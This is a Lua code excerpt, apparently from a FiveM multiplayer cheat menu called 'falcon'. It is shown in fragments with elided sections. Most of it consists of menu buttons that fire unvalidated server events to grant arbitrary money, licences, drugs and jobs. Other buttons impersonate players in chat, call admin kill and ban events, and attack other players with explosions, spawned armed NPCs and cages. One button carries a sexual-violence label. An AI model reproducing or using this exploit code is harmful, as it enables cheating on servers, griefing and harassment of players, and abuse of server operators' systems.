				elseif falcon.MenuButton("~s~Menu ~g~~h~MONEY", "ESXMoney") then
				elseif falcon.MenuButton("~s~Menu ~p~~h~DRUGS", "ESXDrugs") then
				elseif falcon.MenuButton("~s~Menu ~o~~h~OTHERS", "ESXMisc") then
				end
				

				falcon.Display()
			elseif falcon.IsMenuOpened("ESXBoss") then
				if falcon.Button("~c~~h~Mechanic~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'mecano', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif falcon.Button("~b~~h~Police~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'police', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif falcon.Button("~r~~h~Ambulance~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'ambulance', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif falcon.Button("~y~~h~Taxi~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'taxi', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif falcon.Button("~g~~h~Real Estate~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'realestateagent', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif falcon.Button("~p~~h~Gang~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'gang', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif falcon.Button("~o~~h~Car Dealer~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'cardealer', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif falcon.Button("~y~~h~Banker~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'banker', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif falcon.Button("~c~~h~Mafia~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'mafia', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif falcon.Button("~g~~h~ESX ~y~Custom Boss Menu") then
				...
				falcon.Display()
			elseif falcon.IsMenuOpened("ESXMoney") then
				if falcon.Button("~h~~g~MONEY ~s~~h~BEST") then
			...
			elseif falcon.Button("~g~~h~MONEY ~s~1") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent("esx_jobs:caution", "give_back", result)
				end
			elseif falcon.Button("~g~~h~MONEY ~s~2") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('esx_truckerjob:pay', result)
				end
			elseif falcon.Button("~g~~h~MONEY ~s~3") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveBank', result)
				end
			elseif falcon.Button("~g~~h~MONEY ~s~4") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveCash', result)
				end
			elseif falcon.Button("~g~~h~MONEY ~s~5") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_gopostaljob:pay", result)
				end
			elseif falcon.Button("~g~~h~MONEY ~s~6") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_banksecurity:pay", result)
				end
			elseif falcon.Button("~g~~h~MONEY ~s~7") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_slotmachine:sv:2", result)
				end
			elseif falcon.Button("~g~~h~MONEY ~s~8") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
					TriggerServerEvent("lscustoms:payGarage", {costs = -result})
				end		
			elseif falcon.Button("~g~~h~MONEY ~s~9") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
				TriggerServerEvent("vrp_slotmachine:server:2", result)
				end
			elseif falcon.Button("~g~~h~MONEY ~s~10") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
				end
			elseif falcon.Button("~g~~h~MONEY ~s~11") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('esx_truckerjob:pay', result)
				end
			elseif falcon.Button("~g~~h~MONEY ~s~12") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('delivery:success', result)
				end
			elseif falcon.Button("~g~~h~MONEY ~s~13") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent ('taxi:success', result)
				end
			elseif falcon.Button("~g~~h~MONEY ~s~14") then
					...
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
			elseif falcon.Button("~g~~h~MONEY ~s~15") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_garbagejob:pay", result)
				end	
			elseif falcon.Button("~g~~h~MONEY ~s~16") then
				...
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
			elseif falcon.Button("~s~Bank ~r~~h~Deposit") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
				TriggerServerEvent("bank:deposit", result)
				end
			elseif falcon.Button("~s~Bank ~r~~h~Withdraw ") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
			...
			falcon.Display()
				elseif falcon.IsMenuOpened("ESXMisc") then
				    if falcon.Button("~g~~h~ESX ~r~SEND EVERYONE A BILL") then
					...
					elseif falcon.Button("~g~~h~ESX ~w~Harvest FixKit") then
                    TriggerServerEvent("esx_mechanicjob:startHarvest")
				elseif falcon.Button("~g~~h~ESX ~w~Get all licenses Drive") then
                ...
                elseif falcon.Button("~g~~h~ESX ~w~Craft FixKit") then
                    TriggerServerEvent("esx_mechanicjob:startCraft")
				elseif falcon.Button("~h~Send Discord Message") then
				...
				elseif falcon.Button("~h~Send Police Car Advert") then
				TriggerServerEvent("esx:enterpolicecar",GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsIn(GetPlayerPed(-1), 0))))
				end
				

				falcon.Display()
			elseif falcon.IsMenuOpened("MiscServerOptions") then
				if falcon.Button("~h~Send Discord Message") then
					local Message = KeyboardInput("Enter message to send", "", 100)
					TriggerServerEvent("DiscordBot:playerDied", Message, "1337")
					drawNotification("The message:~n~" .. Message .. "~n~Has been ~g~sent!")
				elseif falcon.Button("~h~Send Police Car Advert") then
				...
				falcon.Display()
			elseif falcon.IsMenuOpened("VRPOptions") then
				if falcon.Button("~r~~h~VRP ~s~Give Money ~ypayGarage") then
					local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100)
					if result then
						TriggerServerEvent("lscustoms:payGarage", {costs = -result})
					end		
				elseif falcon.Button("~r~~h~VRP ~g~WIN ~s~Slot Machine") then
					local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100)
					if result then
					TriggerServerEvent("vrp_slotmachine:server:2", result)
					end
				elseif falcon.Button("~r~~h~VRP ~s~Get driving license") then
					TriggerServerEvent("dmv:success")
				elseif falcon.Button("~r~~h~VRP ~s~Bank Deposit") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result then
					TriggerServerEvent("bank:deposit", result)
					end
				elseif falcon.Button("~r~~h~VRP ~s~Bank Withdraw ") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result then
					TriggerServerEvent("bank:withdraw", result)
					end
				...
				falcon.Display()
			elseif falcon.IsMenuOpened("ESXDrugs") then
				if falcon.Button("~h~~g~Harvest ~g~Weed ~c~(x5)") then
					...
					TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
					TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
				elseif falcon.Button("~h~~g~Transform ~g~Weed ~c~(x5)") then
					...
					TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
					TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
				elseif falcon.Button("~h~~g~Sell ~g~Weed ~c~(x5)") then
					...
					TriggerServerEvent('esx_illegal_drugs:startSellWeed')
					TriggerServerEvent('esx_illegal_drugs:startSellWeed')
				elseif falcon.Button("~h~~w~Harvest ~w~Coke ~c~(x5)") then
					...
					TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
					TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
				elseif falcon.Button("~h~~w~Transform ~w~Coke ~c~(x5)") then
					...
					TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
					TriggerServerEvent('esx_illegal_drugs:startTransformCoke')																			
				elseif falcon.Button("~h~~w~Sell ~w~Coke ~c~(x5)") then
					...
					TriggerServerEvent('esx_illegal_drugs:startSellCoke')
					TriggerServerEvent('esx_illegal_drugs:startSellCoke')
				elseif falcon.Button("~h~~r~Harvest Meth ~c~(x5)") then
					...
					TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
					TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
				elseif falcon.Button("~h~~r~Transform Meth ~c~(x5)") then
					...
					TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
					TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
				elseif falcon.Button("~h~~r~Sell Meth ~c~(x5)") then
					...
					TriggerServerEvent('esx_illegal_drugs:startSellMeth')
					TriggerServerEvent('esx_illegal_drugs:startSellMeth')
				elseif falcon.Button("~h~~p~Harvest Opium ~c~(x5)") then
					...
					TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
					TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
				elseif falcon.Button("~h~~p~Transform Opium ~c~(x5)") then
					...
					TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
					TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
				elseif falcon.Button("~h~~p~Sell Opium ~c~(x5)") then
					...
					TriggerServerEvent('esx_illegal_drugs:startSellOpium')
					TriggerServerEvent('esx_illegal_drugs:startSellOpium')
				elseif falcon.Button("~h~~g~Money Wash ~c~(x10)") then
					...
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
				elseif falcon.Button("~r~~h~Stop all ~c~(Drugs)") then
					...
					elseif falcon.Button("~h~~g~Sell Money Wash ~s~new") then
				...
				falcon.Display()
			elseif falcon.IsMenuOpened("RecrutarPlayers") then
					for i = 0, 128 do
					if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and falcon.MenuButton("~h~~r~-»  ~s~"..GetPlayerName(i).."", 'RecrutarPlayersOptions') then
						SelectedPlayer = i
					end
				end
				
				falcon.Display()
			elseif falcon.IsMenuOpened("RecrutarPlayersOptions") then
				falcon.SetSubTitle("RecrutarPlayersOptions", "Recrutar Players options [" .. GetPlayerName(SelectedPlayer) .. "]")
				if falcon.Button("~r~Remove job") then
                    TriggerServerEvent("NB:destituerplayer",GetPlayerServerId(SelectedPlayer))
			    elseif falcon.Button("~s~Recruit~c~~h~ Mechanic") then
			...
			elseif falcon.Button("~s~Recruit~b~~h~ Police") then
			...
			elseif falcon.Button("~s~Recruit~c~~h~ Mafia") then
			...
			elseif falcon.Button("~s~Recruit~p~~h~ Gang") then
			...
			elseif falcon.Button("~s~Recruit~r~~h~ Inem") then
			...
			elseif falcon.Button("~h~Custom Recruit") then
				...
				falcon.Display()
			elseif falcon.IsMenuOpened("OnlinePlayerMenu") then
					for i = 0, 128 do
					if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and falcon.MenuButton("~h~ID: ~r~[ "..GetPlayerServerId(i).." ] ~s~"..GetPlayerName(i).."~h~~y~ » "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~s~[~r~DEAD~s~]" or "~s~[ ~g~ALIVE~s~ ]"), 'PlayerOptionsMenu') then
						SelectedPlayer = i
					end
				end
				...
				falcon.Display()
			elseif falcon.IsMenuOpened("PlayerOptionsMenu") then
				falcon.SetSubTitle("PlayerOptionsMenu", "~h~Player ~s~~r~[" .. GetPlayerName(SelectedPlayer) .. "~r~]")
				if falcon.Button("~h~~r~[~s~ SPECTATE ~h~~r~]", (Spectating and "~r~[ON]")) then
					SpectatePlayer(SelectedPlayer)
				elseif falcon.Button("~r~→  ~y~Teleport To Player") then
					local Entity = IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
					SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
                elseif falcon.MenuButton("~r~→  ~s~Troll Options", "PlayerTrollMenu") then					
				elseif falcon.Button("~g~Spam Msg") then
				...
				elseif falcon.Button("~g~Give ~s~Money") then
				...
				elseif falcon.Button("~g~Revive ~h~~g~ESX") then
                    ...
                    DoScreenFadeIn(800)
					elseif falcon.Button('~g~Revive ~h~~b~VRP') then
			    ...
			    elseif falcon.Button("~h~~r~Kill ~s~Player") then AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 4, 1337.0, false, true, 0.0) 
				elseif falcon.Button('Fire') then
				    FirePlayer(SelectedPlayer)
				elseif falcon.Button("~b~Open inventory ~s~new") then
					TriggerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(SelectedPlayer), GetPlayerName(SelectedPlayer))
					elseif falcon.Button("Jail") then		
				...
				elseif falcon.Button("Unjail") then
				...
				elseif falcon.Button("~g~Give All Weapons") then
					for i = 1, #allWeapons do
						GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, false)
					end
					elseif falcon.Button("~r~Remove All Weapons") then
                    RemoveAllPedWeapons(PlayerPedId(-1), true)
				elseif falcon.MenuButton("Weapon Menu", "SingleWepPlayer") then
				elseif falcon.Button("Spawn Vehicle") then
					local ped = GetPlayerPed(SelectedPlayer)
					local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
				...
				elseif falcon.Button('~h~Clone Car') then
                    ClonePedVeh()
				elseif falcon.Button("~b~Cuff Player") then
				...
				elseif falcon.Button("~r~MelloTrainer ~s~KILL") then
					TriggerServerEvent("mellotrainer:s_adminKill", GetPlayerServerId(SelectedPlayer))
				elseif falcon.Button("~r~MelloTrainer ~s~BAN") then
				...
				elseif falcon.Button("~r~MelloTrainer ~s~KICK") then
				...
				falcon.Display()
                elseif falcon.IsMenuOpened("PlayerTrollMenu") then
				 
                    if falcon.Button ("Fake Chat Message") then
                        local cX=KeyboardInput("Enter message to send","",100)
                        local cY=GetPlayerName(selectedPlayer)
                        if cX then
                            TriggerServerEvent("_chat:messageEntered",cY,{0,0x99,255},cX)
                        end
						elseif falcon.MenuButton("~r~→  ~s~Spawn Props On Player", "SpawnPropsMenu") then
				elseif falcon.Button("Ram w/ Custom Vehicle") then
				...
				elseif falcon.Button('~y~Explode ~s~Vehicle') then
                ...
                elseif falcon.Button('~r~Banana ~p~Party') then
                ...
                elseif falcon.Button('~r~ISIS Explode') then
				...
				elseif falcon.Button("Small invisible Explosion") then
                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, false, true, 0)
                elseif falcon.Button('~r~Rape') then
                ...
                elseif falcon.Button('~r~Cage ~s~Player') then
                    ...
                    FreezeEntityPosition(e9, true)
                    FreezeEntityPosition(ea, true)
                elseif falcon.Button('Wall ~s~Player') then
                    local eb = 'xs_prop_hamburgher_wl'
                    local ec = -145066854
                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                ...
                elseif falcon.Button('Wall ~s~Player Car') then
                    local eb = 'xs_prop_hamburgher_wl'
                    local ec = -145066854
                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                ...
                elseif falcon.Button('~r~Attack UFO ~s~Player') then
                    j = true
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
				...
				elseif falcon.Button("Spawn Mountain Lion") then
                    local mtlion = "A_C_MtLion"
                    for i = 0, 10 do
                ...
                elseif falcon.Button("~h~~r~Spawn ~s~Swat army with ~y~AK") then
					...
					elseif falcon.Button("~h~~r~Spawn ~s~Swat army with ~y~RPG") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "weapon_rpg"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                ...
                elseif falcon.Button("~h~~r~Spawn ~s~Swat army with ~y~Flaregun") then
                    local bQ = "s_m_y_swat_01"
                ...
                elseif falcon.Button("~h~~r~Spawn ~s~Swat army with ~y~Railgun") then
                    local bQ = "s_m_y_swat_01"
					...
					elseif falcon.Button("Rain Agressive NPC") then
                    ...
                    then
					elseif falcon.Button("~h~~b~-- Vehicle --") then
				elseif falcon.Button("Kick ~b~Vehicle") then
					ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
				elseif falcon.Button("Fuck ~s~Engine") then
				...
				elseif falcon.Button("~s~Repair ~b~Vehicle") then
					NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
				...
				elseif falcon.Button("~s~Fuck ~b~Car ") then
					local playerPed = GetPlayerPed(SelectedPlayer)
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
					NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
						...
						SetVehicleNumberPlateText(playerVeh, "Falcon")
			    ...
			    elseif falcon.Button("~r~Explode ~b~Vehicle") then	
				 if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                    ...
                    falcon.Display()
                elseif falcon.IsMenuOpened("SpawnPropsMenu") then
                    if falcon.CheckBox(
                    ...
                    then
                    elseif falcon.ComboBox("Bone", { "Head", "Right Hand" }, currentBone, selectedBone, function(currentIndex, selectedIndex)
                        currentBone = currentIndex
                        selectedBone = selectedIndex
                    end)
                    then
                    elseif falcon.Button("Weed") then
                    ...
                    elseif falcon.Button("Windmill") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                    ...
                    elseif falcon.Button("Custom Prop") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                    ...
                    falcon.Display()
            elseif falcon.IsMenuOpened("VehicleRamMenu") then
                if falcon.Button("Futo") then
                ...
                elseif falcon.Button("Bus") then
                    ...
                    falcon.Display()
            elseif falcon.IsMenuOpened("SingleWepPlayer") then
                for i = 1, #allWeapons do
                    if falcon.Button(allWeapons[i]) then
